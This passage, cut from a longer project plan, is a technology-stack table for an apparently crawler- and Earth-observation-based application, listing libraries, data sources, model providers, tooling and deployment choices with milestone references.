| Durable runs | DBOS Transact (fallback: own memoised-step runner) | S2.1 spike decides |
| Model API | `openai` SDK against OpenAI-compatible providers | free tiers (Groq, Cerebras, OpenRouter free, NVIDIA NIM); DeepSeek API optional; local Ollama later (§11) |
| Embeddings | fastembed (ONNX, CPU) | when a story needs similarity; no PyTorch |
| Earth observation | Copernicus Data Space (Sentinel-1/2) APIs, NASA FIRMS and GIBS, Open-Meteo; numpy + Pillow for simple image work | M4 Earth observation pack |
| Maps | MapLibre GL with free OpenFreeMap tiles | M3 onwards |
| Text extraction | trafilatura, pypdf | avoid AGPL libraries (e.g. PyMuPDF) |
| Robots | protego | |
| Near-duplicates | datasketch (MinHash) | M2 |
| Domains | tldextract with bundled suffix list (no network at runtime) | |
| WARC | warcio | M2 |
| Logging | structlog | |
| Web | React, TypeScript, Vite, TanStack Query, Tailwind, openapi-typescript | M3 |
| Development | GitHub Codespaces with a dev container (Python 3.12, uv, Docker, Node); Codex CLI as the coding agent | `08_SETUP.md` |
| CI | GitHub Actions | S0.5 |
| Deploy | Docker Compose + Caddy (automatic HTTPS) on an Oracle Cloud Always Free ARM VM; GitHub Pages for the static showcase | M5 demo |

Library versions and licences are re-checked in each story's PLAN; anything unverified is marked so.
